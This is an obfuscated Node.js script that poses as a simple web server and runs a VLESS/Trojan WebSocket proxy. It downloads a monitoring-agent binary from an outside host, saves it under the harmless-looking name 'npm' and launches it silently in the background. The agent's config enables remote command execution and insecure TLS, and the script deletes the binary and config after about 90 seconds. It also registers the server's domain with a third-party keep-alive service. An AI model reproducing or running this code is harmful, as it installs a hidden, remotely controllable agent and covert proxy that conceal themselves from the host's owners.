const _0x232f00=_0x4758;(function(_0x295ab9,_0x494d12){const _0x1df8b6=_0x4758,_0x148da1=_0x295ab9();while(!![]){try{const _0x29a211=parseInt(_0x1df8b6(0xd7))/0x1*(parseInt(_0x1df8b6(0xeb))/0x2)+-parseInt(_0x1df8b6(0x12a))/0x3*(-parseInt(_0x1df8b6(0xf0))/0x4)+parseInt(_0x1df8b6(0x129))/0x5*(parseInt(_0x1df8b6(0xdc))/0x6)+parseInt(_0x1df8b6(0xfb))/0x7+-parseInt(_0x1df8b6(0x11a))/0x8*(parseInt(_0x1df8b6(0xd6))/0x9)+-parseInt(_0x1df8b6(0xf8))/0xa+-parseInt(_0x1df8b6(0xce))/0xb;if(_0x29a211===_0x494d12)break;else _0x148da1['push'](_0x148da1['shift']());}catch(_0x1af712){_0x148da1['push'](_0x148da1['shift']());}}}(_0x9489,0xd823d));const os=require('os'),http=require(_0x232f00(0x12e)),fs=require('fs'),axios=require('axios'),net=require(_0x232f00(0xd3)),path=require(_0x232f00(0xc5)),crypto=require(_0x232f00(0x107)),{Buffer}=require(_0x232f00(0xff)),{exec,execSync}=require(_0x232f00(0xe8)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x232f00(0xf5)][_0x232f00(0xbd)]||_0x232f00(0x120),NEZHA_SERVER=process['env'][_0x232f00(0xcc)]||'',NEZHA_PORT=process[_0x232f00(0xf5)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x232f00(0xf5)]['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||_0x232f00(0xda),AUTO_ACCESS=process[_0x232f00(0xf5)][_0x232f00(0xec)]||!![],WSPATH=process[_0x232f00(0xf5)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x232f00(0xf5)]['SUB_PATH']||_0x232f00(0x113),NAME=process['env'][_0x232f00(0x116)]||'',PORT=process[_0x232f00(0xf5)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3d84bc=_0x232f00;try{const _0x24b770=await axios[_0x3d84bc(0x12b)](_0x3d84bc(0xe3)),_0x996ad=_0x24b770[_0x3d84bc(0xed)];ISP=(_0x996ad[_0x3d84bc(0xc7)]+'-'+_0x996ad['isp'])['replace'](/ /g,'_');}catch(_0x4f212f){ISP='Unknown';}};GetISP();function _0x4758(_0x4cd6ed,_0x550f10){const _0x948927=_0x9489();return _0x4758=function(_0x47586c,_0x162d54){_0x47586c=_0x47586c-0xbc;let _0x3ec543=_0x948927[_0x47586c];return _0x3ec543;},_0x4758(_0x4cd6ed,_0x550f10);}const httpServer=http[_0x232f00(0x123)]((_0x4a687d,_0x30ba03)=>{const _0x54a8fc=_0x232f00;if(_0x4a687d[_0x54a8fc(0xf7)]==='/'){const _0x513efa=path[_0x54a8fc(0x127)](__dirname,_0x54a8fc(0xe2));fs['readFile'](_0x513efa,_0x54a8fc(0xe5),(_0x4ad232,_0x72f5b9)=>{const _0x186487=_0x54a8fc;if(_0x4ad232){_0x30ba03[_0x186487(0x12f)](0xc8,{'Content-Type':_0x186487(0xe6)}),_0x30ba03[_0x186487(0xee)](_0x186487(0x122));return;}_0x30ba03['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x30ba03[_0x186487(0xee)](_0x72f5b9);});return;}else{if(_0x4a687d['url']==='/'+SUB_PATH){const _0x2b762c=NAME?NAME+'-'+ISP:ISP,_0x560330=_0x54a8fc(0xde)+UUID+'@'+DOMAIN+_0x54a8fc(0xc0)+DOMAIN+_0x54a8fc(0x103)+DOMAIN+_0x54a8fc(0x11f)+WSPATH+'#'+_0x2b762c,_0x35e3b1='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x54a8fc(0x11f)+WSPATH+'#'+_0x2b762c,_0x130ba4=_0x560330+'\x0a'+_0x35e3b1,_0xfd2510=Buffer[_0x54a8fc(0xbe)](_0x130ba4)[_0x54a8fc(0x10b)](_0x54a8fc(0xd5));_0x30ba03['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x30ba03[_0x54a8fc(0xee)](_0xfd2510+'\x0a');}else _0x30ba03[_0x54a8fc(0x12f)](0x194,{'Content-Type':_0x54a8fc(0x10c)}),_0x30ba03[_0x54a8fc(0xee)](_0x54a8fc(0x10f));}}),wss=new WebSocket[(_0x232f00(0xe7))]({'server':httpServer}),uuid=UUID[_0x232f00(0xdf)](/-/g,''),DNS_SERVERS=[_0x232f00(0xc6),_0x232f00(0x101)];function resolveHost(_0x3207fe){return new Promise((_0x14db9e,_0x2e1aa9)=>{const _0x1e16dd=_0x4758;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1e16dd(0xfd)](_0x3207fe)){_0x14db9e(_0x3207fe);return;}let _0x1e7311=0x0;function _0x466eb7(){const _0x15b187=_0x1e16dd;if(_0x1e7311>=DNS_SERVERS[_0x15b187(0xc4)]){_0x2e1aa9(new Error('Failed\x20to\x20resolve\x20'+_0x3207fe+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x1e931b=DNS_SERVERS[_0x1e7311];_0x1e7311++;const _0x5cc7d0=_0x15b187(0xca)+encodeURIComponent(_0x3207fe)+_0x15b187(0xe4);axios[_0x15b187(0x12b)](_0x5cc7d0,{'timeout':0x1388,'headers':{'Accept':_0x15b187(0x10e)}})['then'](_0x455493=>{const _0x56ea35=_0x15b187,_0x1891ca=_0x455493[_0x56ea35(0xed)];if(_0x1891ca[_0x56ea35(0xf9)]===0x0&&_0x1891ca[_0x56ea35(0x124)]&&_0x1891ca['Answer'][_0x56ea35(0xc4)]>0x0){const _0x3b4de5=_0x1891ca['Answer'][_0x56ea35(0x11b)](_0x5a121b=>_0x5a121b[_0x56ea35(0x110)]===0x1);if(_0x3b4de5){_0x14db9e(_0x3b4de5[_0x56ea35(0xed)]);return;}}_0x466eb7();})[_0x15b187(0xe9)](_0x19b22a=>{_0x466eb7();});}_0x466eb7();});}function handleVlessConnection(_0x189d24,_0x574f17){const _0x5939b4=_0x232f00,[_0x2af594]=_0x574f17,_0x37dd67=_0x574f17[_0x5939b4(0x12d)](0x1,0x11);if(!_0x37dd67[_0x5939b4(0x12c)]((_0x2439e6,_0x57c274)=>_0x2439e6==parseInt(uuid[_0x5939b4(0xf4)](_0x57c274*0x2,0x2),0x10)))return![];let _0x5648f4=_0x574f17['slice'](0x11,0x12)[_0x5939b4(0xc3)]()+0x13;const _0x2abeaa=_0x574f17[_0x5939b4(0x12d)](_0x5648f4,_0x5648f4+=0x2)[_0x5939b4(0x100)](0x0),_0x29e016=_0x574f17['slice'](_0x5648f4,_0x5648f4+=0x1)[_0x5939b4(0xc3)](),_0x1d029f=_0x29e016==0x1?_0x574f17[_0x5939b4(0x12d)](_0x5648f4,_0x5648f4+=0x4)[_0x5939b4(0x127)]('.'):_0x29e016==0x2?new TextDecoder()[_0x5939b4(0x11d)](_0x574f17[_0x5939b4(0x12d)](_0x5648f4+0x1,_0x5648f4+=0x1+_0x574f17[_0x5939b4(0x12d)](_0x5648f4,_0x5648f4+0x1)[_0x5939b4(0xc3)]())):_0x29e016==0x3?_0x574f17[_0x5939b4(0x12d)](_0x5648f4,_0x5648f4+=0x10)[_0x5939b4(0xea)]((_0x2d35a0,_0x4f349f,_0x3bb517,_0x33c594)=>_0x3bb517%0x2?_0x2d35a0[_0x5939b4(0x108)](_0x33c594[_0x5939b4(0x12d)](_0x3bb517-0x1,_0x3bb517+0x1)):_0x2d35a0,[])[_0x5939b4(0xd2)](_0x3c6da7=>_0x3c6da7[_0x5939b4(0x100)](0x0)['toString'](0x10))[_0x5939b4(0x127)](':'):'';_0x189d24[_0x5939b4(0xd4)](new Uint8Array([_0x2af594,0x0]));const _0x9e07ce=createWebSocketStream(_0x189d24);return resolveHost(_0x1d029f)['then'](_0xb5458b=>{const _0x339a0c=_0x5939b4;net[_0x339a0c(0xfe)]({'host':_0xb5458b,'port':_0x2abeaa},function(){const _0x2d0951=_0x339a0c;this[_0x2d0951(0xcd)](_0x574f17[_0x2d0951(0x12d)](_0x5648f4)),_0x9e07ce['on'](_0x2d0951(0x10d),()=>{})[_0x2d0951(0x111)](this)['on']('error',()=>{})['pipe'](_0x9e07ce);})['on'](_0x339a0c(0x10d),()=>{});})[_0x5939b4(0xe9)](_0x36a456=>{const _0x473ec7=_0x5939b4;net[_0x473ec7(0xfe)]({'host':_0x1d029f,'port':_0x2abeaa},function(){const _0x1fe3d3=_0x473ec7;this[_0x1fe3d3(0xcd)](_0x574f17['slice'](_0x5648f4)),_0x9e07ce['on'](_0x1fe3d3(0x10d),()=>{})['pipe'](this)['on'](_0x1fe3d3(0x10d),()=>{})[_0x1fe3d3(0x111)](_0x9e07ce);})['on'](_0x473ec7(0x10d),()=>{});}),!![];}function _0x9489(){const _0x2d88a4=['http','writeHead','setsid\x20nohup\x20./npm\x20-s\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2096','8443','UUID','from','createWriteStream',':443?encryption=none&security=tls&sni=','finish','digest','readUInt8','length','path','8.8.4.4','country_code','443','https://arm64.ssss.nyc.mn/v1','https://dns.google/resolve?name=','\x20-p\x20','NEZHA_SERVER','write','13048805YSzXOy','once','pop','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','map','net','send','base64','4616694lQGQGZ','593NcGlqr','aarch64','stream','1234.abc.com','client_secret:\x20','1290qhpJUH','--tls','vless://','replace','npm\x20is\x20already\x20running,\x20skip\x20running...','message','index.html','https://api.ip.sb/geoip','&type=A','utf8','text/html','Server','child_process','catch','reduce','382zvsXrB','AUTO_ACCESS','data','end','arm','272JtDltP','writeFileSync','arch','listen','substr','env','includes','url','2311820jjRyRS','Status','2083','8215004JHUViB','false','test','connect','buffer','readUInt16BE','1.1.1.1','https://amd64.ssss.nyc.mn/v1','&fp=chrome&type=ws&host=','unlink','createHash','2053','crypto','concat','application/json','npm','toString','text/plain','error','application/dns-json','Not\x20Found\x0a','type','pipe','npm\x20download\x20successfully','sub','sha224','update','NAME','/bin/bash','npm\x20is\x20running','log','8xDMDQG','find','utf-8','decode','hex','&path=%2F','86ae6ff4-cf59-496b-ac24-069a45b82e24','post','Hello\x20world!','createServer','Answer','config.yaml','chmod\x20+x\x20npm','join','https://arm64.ssss.nyc.mn/agent','35035oppsoZ','987gcfxoO','get','every','slice'];_0x9489=function(){return _0x2d88a4;};return _0x9489();}function handleTrojanConnection(_0x3ca5d5,_0x532abd){const _0x20549b=_0x232f00;try{if(_0x532abd[_0x20549b(0xc4)]<0x3a)return![];const _0x355769=_0x532abd[_0x20549b(0x12d)](0x0,0x38)[_0x20549b(0x10b)](),_0x6a5153=[UUID];let _0x5accc1=null;for(const _0x4eec4b of _0x6a5153){const _0x5eb53e=crypto[_0x20549b(0x105)](_0x20549b(0x114))[_0x20549b(0x115)](_0x4eec4b)[_0x20549b(0xc2)](_0x20549b(0x11e));if(_0x5eb53e===_0x355769){_0x5accc1=_0x4eec4b;break;}}if(!_0x5accc1)return![];let _0x3ac6d0=0x38;_0x532abd[_0x3ac6d0]===0xd&&_0x532abd[_0x3ac6d0+0x1]===0xa&&(_0x3ac6d0+=0x2);const _0x5b6ebd=_0x532abd[_0x3ac6d0];if(_0x5b6ebd!==0x1)return![];_0x3ac6d0+=0x1;const _0x318038=_0x532abd[_0x3ac6d0];_0x3ac6d0+=0x1;let _0x368f5e,_0x2d2d46;if(_0x318038===0x1)_0x368f5e=_0x532abd['slice'](_0x3ac6d0,_0x3ac6d0+0x4)[_0x20549b(0x127)]('.'),_0x3ac6d0+=0x4;else{if(_0x318038===0x3){const _0x32eec0=_0x532abd[_0x3ac6d0];_0x3ac6d0+=0x1,_0x368f5e=_0x532abd[_0x20549b(0x12d)](_0x3ac6d0,_0x3ac6d0+_0x32eec0)[_0x20549b(0x10b)](),_0x3ac6d0+=_0x32eec0;}else{if(_0x318038===0x4)_0x368f5e=_0x532abd[_0x20549b(0x12d)](_0x3ac6d0,_0x3ac6d0+0x10)['reduce']((_0x59b69c,_0x2e0d2c,_0x1b1387,_0x28e5b9)=>_0x1b1387%0x2?_0x59b69c[_0x20549b(0x108)](_0x28e5b9[_0x20549b(0x12d)](_0x1b1387-0x1,_0x1b1387+0x1)):_0x59b69c,[])[_0x20549b(0xd2)](_0x3bbdf8=>_0x3bbdf8['readUInt16BE'](0x0)[_0x20549b(0x10b)](0x10))['join'](':'),_0x3ac6d0+=0x10;else return![];}}_0x2d2d46=_0x532abd['readUInt16BE'](_0x3ac6d0),_0x3ac6d0+=0x2;_0x3ac6d0<_0x532abd[_0x20549b(0xc4)]&&_0x532abd[_0x3ac6d0]===0xd&&_0x532abd[_0x3ac6d0+0x1]===0xa&&(_0x3ac6d0+=0x2);const _0x271998=createWebSocketStream(_0x3ca5d5);return resolveHost(_0x368f5e)['then'](_0x3fd47f=>{const _0x5ac4c0=_0x20549b;net[_0x5ac4c0(0xfe)]({'host':_0x3fd47f,'port':_0x2d2d46},function(){const _0x1e23ae=_0x5ac4c0;_0x3ac6d0<_0x532abd['length']&&this['write'](_0x532abd[_0x1e23ae(0x12d)](_0x3ac6d0)),_0x271998['on'](_0x1e23ae(0x10d),()=>{})[_0x1e23ae(0x111)](this)['on'](_0x1e23ae(0x10d),()=>{})['pipe'](_0x271998);})['on'](_0x5ac4c0(0x10d),()=>{});})[_0x20549b(0xe9)](_0x30599f=>{const _0x27589d=_0x20549b;net[_0x27589d(0xfe)]({'host':_0x368f5e,'port':_0x2d2d46},function(){const _0x19aa14=_0x27589d;_0x3ac6d0<_0x532abd[_0x19aa14(0xc4)]&&this[_0x19aa14(0xcd)](_0x532abd[_0x19aa14(0x12d)](_0x3ac6d0)),_0x271998['on']('error',()=>{})[_0x19aa14(0x111)](this)['on'](_0x19aa14(0x10d),()=>{})['pipe'](_0x271998);})['on']('error',()=>{});}),!![];}catch(_0x880bf6){return![];}}wss['on']('connection',(_0x444f75,_0x499a7b)=>{const _0x3e724d=_0x232f00,_0x5de4a3=_0x499a7b[_0x3e724d(0xf7)]||'';_0x444f75[_0x3e724d(0xcf)](_0x3e724d(0xe1),_0x32a90e=>{const _0xab5feb=_0x3e724d;if(_0x32a90e[_0xab5feb(0xc4)]>0x11&&_0x32a90e[0x0]===0x0){const _0x4ec900=_0x32a90e[_0xab5feb(0x12d)](0x1,0x11),_0x51a4c1=_0x4ec900[_0xab5feb(0x12c)]((_0x5aa697,_0x439596)=>_0x5aa697==parseInt(uuid[_0xab5feb(0xf4)](_0x439596*0x2,0x2),0x10));if(_0x51a4c1){!handleVlessConnection(_0x444f75,_0x32a90e)&&_0x444f75['close']();return;}}!handleTrojanConnection(_0x444f75,_0x32a90e)&&_0x444f75['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x2865d2=_0x232f00,_0x2a2272=os[_0x2865d2(0xf2)]();return _0x2a2272===_0x2865d2(0xef)||_0x2a2272==='arm64'||_0x2a2272===_0x2865d2(0xd8)?!NEZHA_PORT?_0x2865d2(0xc9):_0x2865d2(0x128):!NEZHA_PORT?_0x2865d2(0x102):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0xb0f0f7=_0x232f00;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x17c6d0=getDownloadUrl(),_0x2669be=await axios({'method':_0xb0f0f7(0x12b),'url':_0x17c6d0,'responseType':_0xb0f0f7(0xd9)}),_0x2d72ca=fs[_0xb0f0f7(0xbf)](_0xb0f0f7(0x10a));return _0x2669be[_0xb0f0f7(0xed)][_0xb0f0f7(0x111)](_0x2d72ca),new Promise((_0x35b624,_0x4b2986)=>{const _0x339fcb=_0xb0f0f7;_0x2d72ca['on'](_0x339fcb(0xc1),()=>{const _0x25f548=_0x339fcb;console['log'](_0x25f548(0x112)),exec(_0x25f548(0x126),_0x4ddbad=>{if(_0x4ddbad)_0x4b2986(_0x4ddbad);_0x35b624();});}),_0x2d72ca['on'](_0x339fcb(0x10d),_0x4b2986);});}catch(_0x268480){throw _0x268480;}},runnz=async()=>{const _0x6ccb53=_0x232f00;try{const _0x816422=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x6ccb53(0x11c)});if(_0x816422['trim']()!==''){console['log'](_0x6ccb53(0xe0));return;}}catch(_0x117b44){}await downloadFile();let _0x539c61='',_0xa4af07=[_0x6ccb53(0xc8),_0x6ccb53(0xbc),_0x6ccb53(0x132),'2087',_0x6ccb53(0xfa),_0x6ccb53(0x106)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2d486a=_0xa4af07[_0x6ccb53(0xf6)](NEZHA_PORT)?_0x6ccb53(0xdd):'';_0x539c61=_0x6ccb53(0x130)+NEZHA_SERVER+':'+NEZHA_PORT+_0x6ccb53(0xcb)+NEZHA_KEY+'\x20'+_0x2d486a+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1962ac=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x6ccb53(0xd0)]():'',_0x494003=_0xa4af07[_0x6ccb53(0xf6)](_0x1962ac)?'true':_0x6ccb53(0xfc),_0x5e14f2=_0x6ccb53(0xdb)+NEZHA_KEY+_0x6ccb53(0x131)+NEZHA_SERVER+_0x6ccb53(0xd1)+_0x494003+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x6ccb53(0xf1)](_0x6ccb53(0x125),_0x5e14f2);}_0x539c61='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x6ccb53(0x119)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x539c61,{'shell':_0x6ccb53(0x117)},_0x2b13c7=>{const _0x445b85=_0x6ccb53;if(_0x2b13c7)console[_0x445b85(0x10d)]('npm\x20running\x20error:',_0x2b13c7);else console[_0x445b85(0x119)](_0x445b85(0x118));});}catch(_0x45ee5e){console['error']('error:\x20'+_0x45ee5e);}};async function addAccessTask(){const _0x4301a6=_0x232f00;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x45fcfd='https://'+DOMAIN;try{const _0x12d9d5=await axios[_0x4301a6(0x121)]('https://oooo.serv00.net/add-url',{'url':_0x45fcfd},{'headers':{'Content-Type':_0x4301a6(0x109)}});console[_0x4301a6(0x119)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x11b832){}}const delFiles=()=>{const _0x4d1d8b=_0x232f00;fs[_0x4d1d8b(0x104)](_0x4d1d8b(0x10a),()=>{}),fs[_0x4d1d8b(0x104)](_0x4d1d8b(0x125),()=>{});};httpServer[_0x232f00(0xf3)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
